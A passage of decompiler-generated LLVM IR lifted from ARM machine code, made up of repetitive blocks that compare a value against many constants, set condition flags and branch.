  %v0_f05c = phi i32 [ %.1980, %bb1533 ], [ %v0_f05c.pr, %bb1532 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f05c = icmp eq i32 %v0_f05c, 0
  store i1 %v2_f05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f05c, label %dec_label_pc_f06c, label %dec_label_pc_f064

dec_label_pc_f064:                                ; preds = %thread-pre-split179
  %v2_f064 = icmp ugt i32 %v1_e8e8, 168
  store i1 %v2_f064, i1* %cpsr_c.global-to-local, align 1
  %v7_f064 = icmp eq i32 %v1_e8e8, 169
  store i1 %v7_f064, i1* %cpsr_z.global-to-local, align 1
  %v2_f068 = xor i1 %v2_f064, true
  %v3_f068 = or i1 %v7_f064, %v2_f068
  br i1 %v3_f068, label %dec_label_pc_e8d0, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f064, %thread-pre-split179
  %v2_f06c = icmp ugt i32 %v1_e8e8, 196
  store i1 %v2_f06c, i1* %cpsr_c.global-to-local, align 1
  %v7_f06c = icmp eq i32 %v1_e8e8, 197
  store i1 %v7_f06c, i1* %cpsr_z.global-to-local, align 1
  %v2_f070 = xor i1 %v2_f06c, true
  %v3_f070 = or i1 %v7_f06c, %v2_f070
  br i1 %v3_f070, label %bb1534, label %bb1535

bb1534:                                           ; preds = %dec_label_pc_f06c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1535

bb1535:                                           ; preds = %dec_label_pc_f06c, %bb1534
  %v0_f078.pr = phi i32 [ %v0_f05c, %dec_label_pc_f06c ], [ 0, %bb1534 ]
  %v2_f074 = xor i1 %v7_f06c, true
  %v3_f074 = and i1 %v2_f06c, %v2_f074
  br i1 %v3_f074, label %bb1536, label %thread-pre-split180

bb1536:                                           ; preds = %bb1535
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split180

thread-pre-split180:                              ; preds = %bb1535, %bb1536
  %v0_f078 = phi i32 [ %.1980, %bb1536 ], [ %v0_f078.pr, %bb1535 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f078 = icmp eq i32 %v0_f078, 0
  store i1 %v2_f078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f078, label %dec_label_pc_f088, label %dec_label_pc_f080

dec_label_pc_f080:                                ; preds = %thread-pre-split180
  %v2_f080 = icmp ugt i32 %v1_e8e8, 198
  store i1 %v2_f080, i1* %cpsr_c.global-to-local, align 1
  %v7_f080 = icmp eq i32 %v1_e8e8, 199
  store i1 %v7_f080, i1* %cpsr_z.global-to-local, align 1
  %v2_f084 = xor i1 %v2_f080, true
  %v3_f084 = or i1 %v7_f080, %v2_f084
  br i1 %v3_f084, label %dec_label_pc_e8d0, label %dec_label_pc_f088

dec_label_pc_f088:                                ; preds = %dec_label_pc_f080, %thread-pre-split180
  %v2_f088 = icmp ugt i32 %v1_e8e8, 236
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %v7_f088 = icmp eq i32 %v1_e8e8, 237
  store i1 %v7_f088, i1* %cpsr_z.global-to-local, align 1
  %v2_f08c = xor i1 %v2_f088, true
  %v3_f08c = or i1 %v7_f088, %v2_f08c
  br i1 %v3_f08c, label %bb1537, label %bb1538

bb1537:                                           ; preds = %dec_label_pc_f088
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1538

bb1538:                                           ; preds = %dec_label_pc_f088, %bb1537
  %v0_f094.pr = phi i32 [ %v0_f078, %dec_label_pc_f088 ], [ 0, %bb1537 ]
  %v2_f090 = xor i1 %v7_f088, true
  %v3_f090 = and i1 %v2_f088, %v2_f090
  br i1 %v3_f090, label %bb1539, label %thread-pre-split181

bb1539:                                           ; preds = %bb1538
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split181

thread-pre-split181:                              ; preds = %bb1538, %bb1539
  %v0_f094 = phi i32 [ %.1980, %bb1539 ], [ %v0_f094.pr, %bb1538 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f094 = icmp eq i32 %v0_f094, 0
  store i1 %v2_f094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f094, label %dec_label_pc_f0a4, label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %thread-pre-split181
  %v2_f09c = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_f09c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f09c, label %dec_label_pc_f0a4, label %dec_label_pc_e8d0

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f09c, %thread-pre-split181
  %v2_f0a4 = icmp ugt i32 %v1_e8e8, 111
  store i1 %v2_f0a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0a4 = icmp eq i32 %v1_e8e8, 112
  store i1 %v7_f0a4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0a8 = xor i1 %v2_f0a4, true
  %v3_f0a8 = or i1 %v7_f0a4, %v2_f0a8
  br i1 %v3_f0a8, label %bb1540, label %bb1541

bb1540:                                           ; preds = %dec_label_pc_f0a4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1541

bb1541:                                           ; preds = %dec_label_pc_f0a4, %bb1540
  %v0_f0b0.pr = phi i32 [ %v0_f094, %dec_label_pc_f0a4 ], [ 0, %bb1540 ]
  %v2_f0ac = xor i1 %v7_f0a4, true
  %v3_f0ac = and i1 %v2_f0a4, %v2_f0ac
  br i1 %v3_f0ac, label %bb1542, label %thread-pre-split182

bb1542:                                           ; preds = %bb1541
  store i32 %.1982, i32* %r3.global-to-local, align 4
  br label %thread-pre-split182

thread-pre-split182:                              ; preds = %bb1541, %bb1542
  %v0_f0b0 = phi i32 [ %.1982, %bb1542 ], [ %v0_f0b0.pr, %bb1541 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0b0 = icmp eq i32 %v0_f0b0, 0
  store i1 %v2_f0b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0b0, label %dec_label_pc_f0c0, label %dec_label_pc_f0b8

dec_label_pc_f0b8:                                ; preds = %thread-pre-split182
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0bc = xor i1 %v2_e9fc, true
  %v3_f0bc = or i1 %v7_e9fc, %v2_f0bc
  br i1 %v3_f0bc, label %dec_label_pc_e8d0, label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0b8, %thread-pre-split182
  store i32 %.1985, i32* %r3.global-to-local, align 4
  %v2_f0c4 = icmp ugt i32 %v1_e8e8, 149
  store i1 %v2_f0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c4 = icmp eq i32 %v1_e8e8, 150
  store i1 %v7_f0c4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0c8 = xor i1 %v2_f0c4, true
  %v3_f0c8 = or i1 %v7_f0c4, %v2_f0c8
  br i1 %v3_f0c8, label %bb1543, label %bb1544

bb1543:                                           ; preds = %dec_label_pc_f0c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1544

bb1544:                                           ; preds = %dec_label_pc_f0c0, %bb1543
  %v4_f0cc = phi i32 [ %.1985, %dec_label_pc_f0c0 ], [ 0, %bb1543 ]
  %v2_f0cc = xor i1 %v7_f0c4, true
  %v3_f0cc = and i1 %v2_f0c4, %v2_f0cc
  br i1 %v3_f0cc, label %bb1545, label %thread-pre-split183

bb1545:                                           ; preds = %bb1544
  store i32 %v4_f0cc, i32* %r3.global-to-local, align 4
  br label %thread-pre-split183

thread-pre-split183:                              ; preds = %bb1544, %bb1545
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0d0 = icmp eq i32 %v4_f0cc, 0
  store i1 %v2_f0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0d0, label %dec_label_pc_f0e0, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %thread-pre-split183
  store i1 %v2_e9d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9d0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0dc = xor i1 %v2_e9d0, true
  %v3_f0dc = or i1 %v7_e9d0, %v2_f0dc
  br i1 %v3_f0dc, label %dec_label_pc_e8d0, label %dec_label_pc_f0e0

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0d8, %thread-pre-split183
  %v7_f0e0 = icmp eq i32 %v1_e8d4, 153
  %.2011 = zext i1 %v7_f0e0 to i32
  store i32 %.2011, i32* %r3.global-to-local, align 4
  %v2_f0ec = icmp ugt i32 %v1_e8e8, 19
  store i1 %v2_f0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ec = icmp eq i32 %v1_e8e8, 20
  store i1 %v7_f0ec, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f0 = xor i1 %v2_f0ec, true
  %v3_f0f0 = or i1 %v7_f0ec, %v2_f0f0
  br i1 %v3_f0f0, label %.thread186, label %bb1548

.thread186:                                       ; preds = %dec_label_pc_f0e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f104

bb1548:                                           ; preds = %dec_label_pc_f0e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0f4 = icmp eq i1 %v7_f0e0, false
  store i1 %v2_f0f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0f4, label %dec_label_pc_f104, label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %bb1548
  %v2_f0fc = icmp ugt i32 %v1_e8e8, 30
  store i1 %v2_f0fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0fc = icmp eq i32 %v1_e8e8, 31
  store i1 %v7_f0fc, i1* %cpsr_z.global-to-local, align 1
  %v2_f100 = xor i1 %v2_f0fc, true
  %v3_f100 = or i1 %v7_f0fc, %v2_f100
  br i1 %v3_f100, label %dec_label_pc_e8d0, label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %.thread186, %dec_label_pc_f0fc, %bb1548
  store i32 %.1989, i32* %r4.global-to-local, align 4
  %v2_f108 = and i32 %v1_f108, %.1989
  %v4_f108 = icmp eq i32 %v2_f108, 0
  store i1 %v4_f108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f108, label %dec_label_pc_f118, label %dec_label_pc_f110

dec_label_pc_f110:                                ; preds = %dec_label_pc_f104
  %v2_f110 = icmp ugt i32 %v1_e8e8, 8
  store i1 %v2_f110, i1* %cpsr_c.global-to-local, align 1
  %v7_f110 = icmp eq i32 %v1_e8e8, 9
  store i1 %v7_f110, i1* %cpsr_z.global-to-local, align 1
  %v2_f114 = xor i1 %v2_f110, true
  %v3_f114 = or i1 %v7_f110, %v2_f114
  br i1 %v3_f114, label %dec_label_pc_e8d0, label %dec_label_pc_f118

dec_label_pc_f118:                                ; preds = %dec_label_pc_f110, %dec_label_pc_f104
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_f11c = icmp ugt i32 %v1_e8e8, 72
  store i1 %v2_f11c, i1* %cpsr_c.global-to-local, align 1
  %v7_f11c = icmp eq i32 %v1_e8e8, 73
  store i1 %v7_f11c, i1* %cpsr_z.global-to-local, align 1
  %v2_f120 = xor i1 %v2_f11c, true
  %v3_f120 = or i1 %v7_f11c, %v2_f120
  br i1 %v3_f120, label %bb1549, label %bb1550

bb1549:                                           ; preds = %dec_label_pc_f118
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1550

bb1550:                                           ; preds = %dec_label_pc_f118, %bb1549
  %v4_f124 = phi i32 [ %.1989, %dec_label_pc_f118 ], [ 0, %bb1549 ]
  %v2_f124 = xor i1 %v7_f11c, true
  %v3_f124 = and i1 %v2_f11c, %v2_f124
  br i1 %v3_f124, label %bb1551, label %thread-pre-split189

bb1551:                                           ; preds = %bb1550
  store i32 %v4_f124, i32* %r3.global-to-local, align 4
  br label %thread-pre-split189

thread-pre-split189:                              ; preds = %bb1550, %bb1551
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f128 = icmp eq i32 %v4_f124, 0
  store i1 %v2_f128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f128, label %dec_label_pc_f138, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %thread-pre-split189
  %v2_f130 = icmp ugt i32 %v1_e8e8, 87
  store i1 %v2_f130, i1* %cpsr_c.global-to-local, align 1
  %v7_f130 = icmp eq i32 %v1_e8e8, 88
  store i1 %v7_f130, i1* %cpsr_z.global-to-local, align 1
  %v2_f134 = xor i1 %v2_f130, true
  %v3_f134 = or i1 %v7_f130, %v2_f134
  br i1 %v3_f134, label %dec_label_pc_e8d0, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f130, %thread-pre-split189
  store i32 %.1989, i32* %r3.global-to-local, align 4
  %v2_f13c = icmp ugt i32 %v1_e8e8, 211
  store i1 %v2_f13c, i1* %cpsr_c.global-to-local, align 1
  %v7_f13c = icmp eq i32 %v1_e8e8, 212
  store i1 %v7_f13c, i1* %cpsr_z.global-to-local, align 1
  %v2_f140 = xor i1 %v2_f13c, true
  %v3_f140 = or i1 %v7_f13c, %v2_f140
  br i1 %v3_f140, label %bb1552, label %bb1553

bb1552:                                           ; preds = %dec_label_pc_f138
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1553

bb1553:                                           ; preds = %dec_label_pc_f138, %bb1552
  %v4_f144 = phi i32 [ %.1989, %dec_label_pc_f138 ], [ 0, %bb1552 ]
  %v2_f144 = xor i1 %v7_f13c, true
  %v3_f144 = and i1 %v2_f13c, %v2_f144
  br i1 %v3_f144, label %bb1554, label %thread-pre-split190

bb1554:                                           ; preds = %bb1553
  store i32 %v4_f144, i32* %r3.global-to-local, align 4
  br label %thread-pre-split190

thread-pre-split190:                              ; preds = %bb1553, %bb1554
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f148 = icmp eq i32 %v4_f144, 0
  store i1 %v2_f148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f148, label %dec_label_pc_f158, label %dec_label_pc_f150

dec_label_pc_f150:                                ; preds = %thread-pre-split190
  %v2_f150 = icmp ugt i32 %v1_e8e8, 220
  store i1 %v2_f150, i1* %cpsr_c.global-to-local, align 1
  %v7_f150 = icmp eq i32 %v1_e8e8, 221
  store i1 %v7_f150, i1* %cpsr_z.global-to-local, align 1
  %v2_f154 = xor i1 %v2_f150, true
  %v3_f154 = or i1 %v7_f150, %v2_f154
  br i1 %v3_f154, label %dec_label_pc_e8d0, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f150, %thread-pre-split190
  store i32 %.1987, i32* %r3.global-to-local, align 4
  store i1 %v2_ea58, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ea58, i1* %cpsr_z.global-to-local, align 1
  %v2_f160 = xor i1 %v2_ea58, true
  %v3_f160 = or i1 %v7_ea58, %v2_f160
  br i1 %v3_f160, label %bb1555, label %bb1556

bb1555:                                           ; preds = %dec_label_pc_f158
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1556

bb1556:                                           ; preds = %dec_label_pc_f158, %bb1555
  %v4_f164 = phi i32 [ %.1987, %dec_label_pc_f158 ], [ 0, %bb1555 ]
  %v2_f164 = xor i1 %v7_ea58, true
  %v3_f164 = and i1 %v2_ea58, %v2_f164
  br i1 %v3_f164, label %bb1557, label %thread-pre-split191

bb1557:                                           ; preds = %bb1556
  store i32 %v4_f164, i32* %r3.global-to-local, align 4
  br label %thread-pre-split191

thread-pre-split191:                              ; preds = %bb1556, %bb1557
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f168 = icmp eq i32 %v4_f164, 0
  store i1 %v2_f168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f168, label %dec_label_pc_f178, label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %thread-pre-split191
  %v2_f170 = icmp ugt i32 %v1_e8e8, 152
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  %v7_f170 = icmp eq i32 %v1_e8e8, 153
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  %v2_f174 = xor i1 %v2_f170, true
  %v3_f174 = or i1 %v7_f170, %v2_f174
  br i1 %v3_f174, label %dec_label_pc_e8d0, label %dec_label_pc_f178

dec_label_pc_f178:                                ; preds = %dec_label_pc_f170, %thread-pre-split191
  %v2_f17c = icmp ugt i32 %v1_e8d4, 157
  store i1 %v2_f17c, i1* %cpsr_c.global-to-local, align 1
  %v7_f17c = icmp eq i32 %v1_e8d4, 158
  %.2012 = zext i1 %v7_f17c to i32
  store i32 %.2012, i32* %r3.global-to-local, align 4
  %v2_f188 = and i32 %v0_ff48, %.2012
  %v4_f188 = icmp eq i32 %v2_f188, 0
  store i1 %v4_f188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f188, label %dec_label_pc_f198, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f178
  store i1 %v2_f0ec, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f0f0, label %dec_label_pc_e8d0, label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %dec_label_pc_f190, %dec_label_pc_f178
  %v2_f198 = icmp ugt i32 %v1_e8e8, 233
  store i1 %v2_f198, i1* %cpsr_c.global-to-local, align 1
  %v7_f198 = icmp eq i32 %v1_e8e8, 234
  store i1 %v7_f198, i1* %cpsr_z.global-to-local, align 1
  %v2_f19c = xor i1 %v2_f198, true
  %v3_f19c = or i1 %v7_f198, %v2_f19c
  br i1 %v3_f19c, label %bb1560, label %bb1561

bb1560:                                           ; preds = %dec_label_pc_f198
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1561

bb1561:                                           ; preds = %dec_label_pc_f198, %bb1560
  %v4_f1a0 = phi i32 [ %.2012, %dec_label_pc_f198 ], [ 0, %bb1560 ]
  %v2_f1a0 = xor i1 %v7_f198, true
  %v3_f1a0 = and i1 %v2_f198, %v2_f1a0
  br i1 %v3_f1a0, label %bb1562, label %thread-pre-split193

bb1562:                                           ; preds = %bb1561
  store i32 %v4_f1a0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split193

thread-pre-split193:                              ; preds = %bb1561, %bb1562
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1a4 = icmp eq i32 %v4_f1a0, 0
  store i1 %v2_f1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1a4, label %dec_label_pc_f1b4, label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %thread-pre-split193
  %v2_f1ac = icmp ugt i32 %v1_e8e8, 245
  store i1 %v2_f1ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f1ac = icmp eq i32 %v1_e8e8, 246
  store i1 %v7_f1ac, i1* %cpsr_z.global-to-local, align 1
  %v2_f1b0 = xor i1 %v2_f1ac, true
  %v3_f1b0 = or i1 %v7_f1ac, %v2_f1b0
  br i1 %v3_f1b0, label %dec_label_pc_e8d0, label %dec_label_pc_f1b4

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f1ac, %thread-pre-split193
  %v7_f1b4 = icmp eq i32 %v1_e8d4, 159
  %.2013 = zext i1 %v7_f1b4 to i32
  %v2_f1c0 = icmp ugt i32 %v1_e8e8, 118
  store i1 %v2_f1c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c0 = icmp eq i32 %v1_e8e8, 119
  store i1 %v7_f1c0, i1* %cpsr_z.global-to-local, align 1
  %v2_f1c4 = xor i1 %v2_f1c0, true
  %v3_f1c4 = or i1 %v7_f1c0, %v2_f1c4
  br i1 %v3_f1c4, label %bb1565, label %bb1566

bb1565:                                           ; preds = %dec_label_pc_f1b4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1566

bb1566:                                           ; preds = %dec_label_pc_f1b4, %bb1565
  %v0_f1cc.pr = phi i32 [ %v4_f1a0, %dec_label_pc_f1b4 ], [ 0, %bb1565 ]
  %v2_f1c8 = xor i1 %v7_f1c0, true
  %v3_f1c8 = and i1 %v2_f1c0, %v2_f1c8
  br i1 %v3_f1c8, label %bb1567, label %thread-pre-split195

bb1567:                                           ; preds = %bb1566
  store i32 %.2013, i32* %r3.global-to-local, align 4
  br label %thread-pre-split195

thread-pre-split195:                              ; preds = %bb1566, %bb1567
  %v0_f1cc = phi i32 [ %.2013, %bb1567 ], [ %v0_f1cc.pr, %bb1566 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1cc = icmp eq i32 %v0_f1cc, 0
  store i1 %v2_f1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1cc, label %dec_label_pc_f1dc, label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %thread-pre-split195
  store i1 %v2_ed00, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ed00, i1* %cpsr_z.global-to-local, align 1
  %v2_f1d8 = xor i1 %v2_ed00, true
  %v3_f1d8 = or i1 %v7_ed00, %v2_f1d8
  br i1 %v3_f1d8, label %dec_label_pc_e8d0, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1d4, %thread-pre-split195
  %v7_f1dc = icmp eq i32 %v1_e8d4, 160
  %.2014 = zext i1 %v7_f1dc to i32
  store i32 %.2014, i32* %r3.global-to-local, align 4
  %v2_f1e8 = icmp ugt i32 %v1_e8e8, 130
  store i1 %v2_f1e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e8 = icmp eq i32 %v1_e8e8, 131
  store i1 %v7_f1e8, i1* %cpsr_z.global-to-local, align 1
  %v2_f1ec = xor i1 %v2_f1e8, true
  %v3_f1ec = or i1 %v7_f1e8, %v2_f1ec
  br i1 %v3_f1ec, label %.thread198, label %bb1570

.thread198:                                       ; preds = %dec_label_pc_f1dc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f200

bb1570:                                           ; preds = %dec_label_pc_f1dc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1f0 = icmp eq i1 %v7_f1dc, false
  store i1 %v2_f1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1f0, label %dec_label_pc_f200, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %bb1570
  store i1 %v2_f0c4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f0c8, label %dec_label_pc_e8d0, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %.thread198, %dec_label_pc_f1f8, %bb1570
  store i32 %.2001, i32* %r3.global-to-local, align 4
  %v2_f204 = icmp ugt i32 %v1_e8e8, 222
  store i1 %v2_f204, i1* %cpsr_c.global-to-local, align 1
  %v7_f204 = icmp eq i32 %v1_e8e8, 223
  store i1 %v7_f204, i1* %cpsr_z.global-to-local, align 1
  %v2_f208 = xor i1 %v2_f204, true
  %v3_f208 = or i1 %v7_f204, %v2_f208
  br i1 %v3_f208, label %bb1571, label %bb1572

bb1571:                                           ; preds = %dec_label_pc_f200
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1572

bb1572:                                           ; preds = %dec_label_pc_f200, %bb1571
  %v4_f20c = phi i32 [ %.2001, %dec_label_pc_f200 ], [ 0, %bb1571 ]
  %v2_f20c = xor i1 %v7_f204, true
  %v3_f20c = and i1 %v2_f204, %v2_f20c
  br i1 %v3_f20c, label %bb1573, label %thread-pre-split201

bb1573:                                           ; preds = %bb1572
  store i32 %v4_f20c, i32* %r3.global-to-local, align 4
  br label %thread-pre-split201

thread-pre-split201:                              ; preds = %bb1572, %bb1573
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f210 = icmp eq i32 %v4_f20c, 0
  store i1 %v2_f210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f210, label %dec_label_pc_f220, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %thread-pre-split201
  %v2_f218 = icmp ugt i32 %v1_e8e8, 225
  store i1 %v2_f218, i1* %cpsr_c.global-to-local, align 1
  %v7_f218 = icmp eq i32 %v1_e8e8, 226
  store i1 %v7_f218, i1* %cpsr_z.global-to-local, align 1
  %v2_f21c = xor i1 %v2_f218, true
  %v3_f21c = or i1 %v7_f218, %v2_f21c
  br i1 %v3_f21c, label %dec_label_pc_e8d0, label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f218, %thread-pre-split201
  store i32 %.1988, i32* %r3.global-to-local, align 4
  store i32 %v0_efbc, i32* %r4.global-to-local, align 4
  %v2_f228 = and i32 %v0_efbc, %.1988
  %v4_f228 = icmp eq i32 %v2_f228, 0
  store i1 %v4_f228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f228, label %dec_label_pc_f238, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f220
  %v2_f230 = icmp ugt i32 %v1_e8e8, 45
  store i1 %v2_f230, i1* %cpsr_c.global-to-local, align 1
  %v7_f230 = icmp eq i32 %v1_e8e8, 46
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  %v2_f234 = xor i1 %v2_f230, true
  %v3_f234 = or i1 %v7_f230, %v2_f234
  br i1 %v3_f234, label %dec_label_pc_e8d0, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f230, %dec_label_pc_f220
  %v7_f238 = icmp eq i32 %v1_e8d4, 163
  %.2015 = zext i1 %v7_f238 to i32
  store i32 %.2015, i32* @sb, align 4
  %v2_f244 = icmp ugt i32 %v1_e8e8, 203
  store i1 %v2_f244, i1* %cpsr_c.global-to-local, align 1
  %v7_f244 = icmp eq i32 %v1_e8e8, 204
  store i1 %v7_f244, i1* %cpsr_z.global-to-local, align 1
  %v2_f248 = xor i1 %v2_f244, true
  %v3_f248 = or i1 %v7_f244, %v2_f248
  br i1 %v3_f248, label %bb1576, label %bb1577

bb1576:                                           ; preds = %dec_label_pc_f238
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1577

bb1577:                                           ; preds = %dec_label_pc_f238, %bb1576
  %v0_f250.pr = phi i32 [ %.1988, %dec_label_pc_f238 ], [ 0, %bb1576 ]
  %v2_f24c = xor i1 %v7_f244, true
  %v3_f24c = and i1 %v2_f244, %v2_f24c
  br i1 %v3_f24c, label %bb1578, label %thread-pre-split203

bb1578:                                           ; preds = %bb1577
  store i32 %.2015, i32* %r3.global-to-local, align 4
  br label %thread-pre-split203

thread-pre-split203:                              ; preds = %bb1577, %bb1578
  %v0_f250 = phi i32 [ %.2015, %bb1578 ], [ %v0_f250.pr, %bb1577 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f250 = icmp eq i32 %v0_f250, 0
  store i1 %v2_f250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f250, label %dec_label_pc_f260, label %dec_label_pc_f258

dec_label_pc_f258:                                ; preds = %thread-pre-split203
  %v2_f258 = icmp ugt i32 %v1_e8e8, 205
  store i1 %v2_f258, i1* %cpsr_c.global-to-local, align 1
  %v7_f258 = icmp eq i32 %v1_e8e8, 206
  store i1 %v7_f258, i1* %cpsr_z.global-to-local, align 1
  %v2_f25c = xor i1 %v2_f258, true
  %v3_f25c = or i1 %v7_f258, %v2_f25c
  br i1 %v3_f25c, label %dec_label_pc_e8d0, label %dec_label_pc_f260

dec_label_pc_f260:                                ; preds = %dec_label_pc_f258, %thread-pre-split203
  store i32 %v0_efbc, i32* %r3.global-to-local, align 4
  %v2_f268 = and i32 %v0_efbc, %.1990
  %v4_f268 = icmp eq i32 %v2_f268, 0
  store i1 %v4_f268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f268, label %dec_label_pc_f278, label %dec_label_pc_f270

dec_label_pc_f270:                                ; preds = %dec_label_pc_f260
  %v2_f270 = icmp ugt i32 %v1_e8e8, 48
  store i1 %v2_f270, i1* %cpsr_c.global-to-local, align 1
  %v7_f270 = icmp eq i32 %v1_e8e8, 49
  store i1 %v7_f270, i1* %cpsr_z.global-to-local, align 1
  %v2_f274 = xor i1 %v2_f270, true
  %v3_f274 = or i1 %v7_f270, %v2_f274
  br i1 %v3_f274, label %dec_label_pc_e8d0, label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f270, %dec_label_pc_f260
  store i32 %.1990, i32* %r3.global-to-local, align 4
  %v2_f27c = icmp ugt i32 %v1_e8e8, 215
  store i1 %v2_f27c, i1* %cpsr_c.global-to-local, align 1
  %v7_f27c = icmp eq i32 %v1_e8e8, 216
  store i1 %v7_f27c, i1* %cpsr_z.global-to-local, align 1
  %v2_f280 = xor i1 %v2_f27c, true
  %v3_f280 = or i1 %v7_f27c, %v2_f280
  br i1 %v3_f280, label %bb1579, label %bb1580

bb1579:                                           ; preds = %dec_label_pc_f278
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1580

bb1580:                                           ; preds = %dec_label_pc_f278, %bb1579
  %v4_f284 = phi i32 [ %.1990, %dec_label_pc_f278 ], [ 0, %bb1579 ]
  %v2_f284 = xor i1 %v7_f27c, true
  %v3_f284 = and i1 %v2_f27c, %v2_f284
  br i1 %v3_f284, label %bb1581, label %thread-pre-split204

